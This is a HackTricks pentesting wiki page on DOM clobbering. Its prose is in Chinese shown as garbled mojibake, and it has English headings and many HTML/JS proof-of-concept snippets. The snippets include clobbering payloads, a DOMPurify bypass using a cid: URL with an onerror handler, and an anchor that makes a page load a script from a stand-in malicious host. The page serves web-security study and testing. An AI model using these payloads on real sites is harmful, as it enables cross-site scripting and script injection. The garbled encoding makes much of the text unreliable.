# Dom Clobbering

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Basics**

It's possible to generate **global variables inside the JS context** with the attributes **`id`** and **`name`** in HTML tags.
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**åªæœ‰**æŸäº›å…ƒç´ å¯ä»¥ä½¿ç”¨**nameå±æ€§**æ¥è¦†ç›–å…¨å±€å˜é‡ï¼Œå®ƒä»¬æ˜¯ï¼š`embed`ã€`form`ã€`iframe`ã€`image`ã€`img`å’Œ`object`ã€‚

æœ‰è¶£çš„æ˜¯ï¼Œå½“æ‚¨ä½¿ç”¨**formå…ƒç´ **æ¥**è¦†ç›–**ä¸€ä¸ªå˜é‡æ—¶ï¼Œæ‚¨å°†è·å¾—å…ƒç´ æœ¬èº«çš„**`toString`**å€¼ï¼š`[object HTMLFormElement]`ï¼Œä½†æ˜¯ä½¿ç”¨**anchor**æ—¶ï¼Œ**`toString`**å°†æ˜¯é”šç‚¹çš„**`href`**ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨ä½¿ç”¨**`a`**æ ‡ç­¾æ¥è¦†ç›–ï¼Œæ‚¨å¯ä»¥åœ¨å°†å…¶è§†ä¸ºå­—ç¬¦ä¸²æ—¶**æ§åˆ¶**è¯¥**å€¼**ï¼š
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### æ•°ç»„å’Œå±æ€§

ä¹Ÿå¯ä»¥**ç¯¡æ”¹æ•°ç»„**å’Œ**å¯¹è±¡å±æ€§**ï¼š
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
è¦è¦†ç›–**ç¬¬ä¸‰ä¸ªå±æ€§**ï¼ˆä¾‹å¦‚ x.y.zï¼‰ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ä¸€ä¸ª**`form`**ï¼š
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
ä½¿ç”¨iframeså¯ä»¥**æ›´å¤æ‚ä½†ä»ç„¶å¯èƒ½**è¦†ç›–æ›´å¤šå±æ€§ï¼š
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
æ ·å¼æ ‡ç­¾ç”¨äºç»™iframeè¶³å¤Ÿçš„æ—¶é—´æ¥æ¸²æŸ“ã€‚å¦‚æœæ²¡æœ‰å®ƒï¼Œä½ ä¼šå‘ç°ä¸€ä¸ªæœªå®šä¹‰çš„è­¦æŠ¥ã€‚
{% endhint %}

è¦æ·±å…¥ç ´åæ›´æ·±å±‚æ¬¡çš„å±æ€§ï¼Œå¯ä»¥ä½¿ç”¨å¸¦æœ‰HTMLç¼–ç çš„iframeï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **ç»•è¿‡è¿‡æ»¤å™¨**

å¦‚æœä¸€ä¸ªè¿‡æ»¤å™¨æ­£åœ¨é€šè¿‡ç±»ä¼¼ `document.getElementByID('x').attributes` è¿™æ ·çš„æ–¹å¼**å¾ªç¯**éå†èŠ‚ç‚¹çš„**å±æ€§**ï¼Œä½ å¯ä»¥**è¦†ç›–**å±æ€§**`.attributes`**å¹¶**ç ´åè¿‡æ»¤å™¨**ã€‚å…¶ä»– DOM å±æ€§å¦‚**`tagName`**ã€**`nodeName`**æˆ–**`parentNode`**ç­‰ä¹Ÿæ˜¯å¯ä»¥**è¦†ç›–**çš„ã€‚
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **Clobbering `window.someObject`**

åœ¨ JavaScript ä¸­ç»å¸¸ä¼šå‘ç°ï¼š
```javascript
var someObject = window.someObject || {};
```
æ“çºµé¡µé¢ä¸Šçš„HTMLå…è®¸ç”¨DOMèŠ‚ç‚¹è¦†ç›–`someObject`ï¼Œå¯èƒ½å¼•å…¥å®‰å…¨æ¼æ´ã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥ç”¨æŒ‡å‘æ¶æ„è„šæœ¬çš„é”šå…ƒç´ æ›¿æ¢`someObject`ï¼š
```html
<a id=someObject href=//malicious-website.com/malicious.js></a>
```
åœ¨ä¸€ä¸ªæ˜“å—æ”»å‡»çš„ä»£ç ä¸­ï¼Œä¾‹å¦‚ï¼š
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
è¿™ç§æ–¹æ³•åˆ©ç”¨è„šæœ¬æºæ¥æ‰§è¡Œä¸éœ€è¦çš„ä»£ç ã€‚

**æŠ€å·§**ï¼š**`DOMPurify`** å…è®¸æ‚¨ä½¿ç”¨ **`cid:`** åè®®ï¼Œè¯¥åè®®**ä¸ä¼šå¯¹åŒå¼•å·è¿›è¡Œ URL ç¼–ç **ã€‚è¿™æ„å‘³ç€æ‚¨å¯ä»¥**æ³¨å…¥ä¸€ä¸ªç¼–ç çš„åŒå¼•å·ï¼Œåœ¨è¿è¡Œæ—¶å°†è¢«è§£ç **ã€‚å› æ­¤ï¼Œæ³¨å…¥ç±»ä¼¼äº **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** çš„å†…å®¹å°†ä½¿ HTML ç¼–ç çš„ `&quot;` åœ¨è¿è¡Œæ—¶**è§£ç **å¹¶**ä»å±æ€§å€¼ä¸­è½¬ä¹‰**ä»¥**åˆ›å»º**`onerror`**äº‹ä»¶**ã€‚

å¦ä¸€ç§æŠ€æœ¯ä½¿ç”¨äº†ä¸€ä¸ª**`form`**å…ƒç´ ã€‚æŸäº›å®¢æˆ·ç«¯åº“ä¼šæ£€æŸ¥æ–°åˆ›å»ºçš„è¡¨å•å…ƒç´ çš„å±æ€§ä»¥è¿›è¡Œæ¸…ç†ã€‚ä½†æ˜¯ï¼Œé€šè¿‡åœ¨è¡¨å•å†…æ·»åŠ ä¸€ä¸ªå¸¦æœ‰`id=attributes`çš„`input`ï¼Œæ‚¨å®é™…ä¸Šè¦†ç›–äº†å±æ€§å±æ€§ï¼Œé˜»æ­¢äº†æ¶ˆæ¯’å‰‚è®¿é—®å®é™…å±æ€§ã€‚

æ‚¨å¯ä»¥åœ¨[**è¿™ç¯‡ CTF è§£å¯†ä¸­æ‰¾åˆ°è¿™ç§ç±»å‹çš„è¦†ç›–ç¤ºä¾‹**](iframes-in-xss-and-csp.md#iframes-in-sop-2)ã€‚

## è¦†ç›–æ–‡æ¡£å¯¹è±¡

æ ¹æ®æ–‡æ¡£ï¼Œå¯ä»¥ä½¿ç”¨ DOM è¦†ç›–æ¥è¦†ç›–æ–‡æ¡£å¯¹è±¡çš„å±æ€§ï¼š

> [æ–‡æ¡£](https://html.spec.whatwg.org/multipage/dom.html#document)æ¥å£[æ”¯æŒå‘½åå±æ€§](https://webidl.spec.whatwg.org/#dfn-support-named-properties)ã€‚[æ–‡æ¡£](https://html.spec.whatwg.org/multipage/dom.html#document)å¯¹è±¡ document åœ¨ä»»ä½•æ—¶åˆ»æ”¯æŒçš„å±æ€§åç§°åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ï¼ŒæŒ‰ç…§è´¡çŒ®å®ƒä»¬çš„å…ƒç´ çš„[æ ‘é¡ºåº](https://dom.spec.whatwg.org/#concept-tree-order)æ’åˆ—ï¼Œå¿½ç•¥åç»­çš„é‡å¤ï¼Œå¹¶ä¸”åœ¨ç›¸åŒå…ƒç´ åŒæ—¶è´¡çŒ® id å±æ€§å’Œ name å±æ€§æ—¶ï¼Œæ¥è‡ª id å±æ€§çš„å€¼ä¼˜å…ˆäºæ¥è‡ª name å±æ€§çš„å€¼ï¼š
>
> \- æ‰€æœ‰å…·æœ‰éç©ºåç§°å†…å®¹å±æ€§å¹¶ä¸”åœ¨æ–‡æ¡£æ ‘ä¸­å…·æœ‰ document ä½œä¸º[æ ¹](https://dom.spec.whatwg.org/#concept-tree-root)çš„[å…¬å¼€](https://html.spec.whatwg.org/multipage/dom.html#exposed) [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element)ã€[form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element)ã€[iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element)ã€[img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element)å’Œ[å…¬å¼€](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element)å…ƒç´ çš„åç§°å†…å®¹å±æ€§çš„å€¼ï¼›\
> \
> \- æ‰€æœ‰å…·æœ‰éç©º[id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)å†…å®¹å±æ€§å¹¶ä¸”åœ¨æ–‡æ¡£æ ‘ä¸­å…·æœ‰ document ä½œä¸º[æ ¹](https://dom.spec.whatwg.org/#concept-tree-root)çš„[å…¬å¼€](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element)å…ƒç´ çš„[id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)å†…å®¹å±æ€§çš„å€¼ï¼›\
> \
> \- æ‰€æœ‰å…·æœ‰éç©º[id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)å†…å®¹å±æ€§å’Œéç©ºåç§°å†…å®¹å±æ€§çš„[img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element)å…ƒç´ çš„[id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)å†…å®¹å±æ€§çš„å€¼ï¼Œå¹¶ä¸”åœ¨æ–‡æ¡£æ ‘ä¸­å…·æœ‰ document ä½œä¸º[æ ¹](https://dom.spec.whatwg.org/#concept-tree-root)ã€‚

ä½¿ç”¨è¿™ç§æŠ€æœ¯ï¼Œæ‚¨å¯ä»¥è¦†ç›–å¸¸ç”¨çš„å€¼ï¼Œå¦‚`document.cookie`ã€`document.body`ã€`document.children`ï¼Œç”šè‡³æ–‡æ¡£æ¥å£ä¸­çš„æ–¹æ³•ï¼Œå¦‚`document.querySelector`ã€‚
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)Â [img, form, cookie: img]

typeof(document.cookie)
'object
```
## å…ƒç´ è¢«è¦†ç›–åçš„å†™å…¥

é€šè¿‡æ³¨å…¥å…·æœ‰ç›¸åŒidå±æ€§çš„`<html>`æˆ–`<body>`æ ‡ç­¾ï¼Œå¯ä»¥æ›´æ”¹å¯¹**`document.getElementById()`**å’Œ**`document.querySelector()`**çš„è°ƒç”¨ç»“æœã€‚ä»¥ä¸‹æ˜¯å¦‚ä½•å®ç°çš„ï¼š
```html
<div style="display:none" id="cdnDomain" class="x">test</div>
<p>
<html id="cdnDomain" class="x">clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
alert(document.querySelector('.x').innerText); // Clobbered
</script>
```
æ­¤å¤–ï¼Œé€šè¿‡ä½¿ç”¨æ ·å¼æ¥éšè—è¿™äº›æ³¨å…¥çš„HTML/bodyæ ‡ç­¾ï¼Œå¯ä»¥é˜²æ­¢`innerText`ä¸­å…¶ä»–æ–‡æœ¬çš„å¹²æ‰°ï¼Œä»è€Œå¢å¼ºæ”»å‡»çš„æœ‰æ•ˆæ€§ï¼š
```html
<div style="display:none" id="cdnDomain">test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
è°ƒæŸ¥å‘ç°SVGå¯ä»¥æœ‰æ•ˆåœ°åˆ©ç”¨`<body>`æ ‡ç­¾ï¼š
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><body id="cdnDomain">clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
åœ¨åƒChromeå’ŒFirefoxè¿™æ ·çš„æµè§ˆå™¨ä¸­ï¼Œè¦ä½¿HTMLæ ‡ç­¾åœ¨SVGå†…èµ·ä½œç”¨ï¼Œéœ€è¦ä½¿ç”¨`<foreignobject>`æ ‡ç­¾ï¼š
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg>
<foreignobject>
<html id="cdnDomain">clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
## Clobbering Forms

å¯ä»¥é€šè¿‡åœ¨æŸäº›æ ‡ç­¾ä¸­æŒ‡å®š`form`å±æ€§æ¥å‘è¡¨å•ä¸­æ·»åŠ æ–°æ¡ç›®ã€‚æ‚¨å¯ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³•å‘è¡¨å•ä¸­æ·»åŠ æ–°å€¼ï¼Œç”šè‡³æ·»åŠ ä¸€ä¸ªæ–°çš„æŒ‰é’®æ¥å‘é€å®ƒï¼ˆç‚¹å‡»åŠ«æŒæˆ–æ»¥ç”¨ä¸€äº›`.click()` JSä»£ç ï¼‰ï¼š
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* è¦æŸ¥çœ‹æ›´å¤š[**æŒ‰é’®çš„è¡¨å•å±æ€§ï¼Œè¯·ç‚¹å‡»æ­¤å¤„**](https://www.w3schools.com/tags/tag\_button.asp)**ã€‚**

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­è¢«å¹¿å‘Š**å—ï¼Ÿ æˆ–è€…æ‚¨æƒ³è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿ è¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– **ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨Twitterä¸Šå…³æ³¨** æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
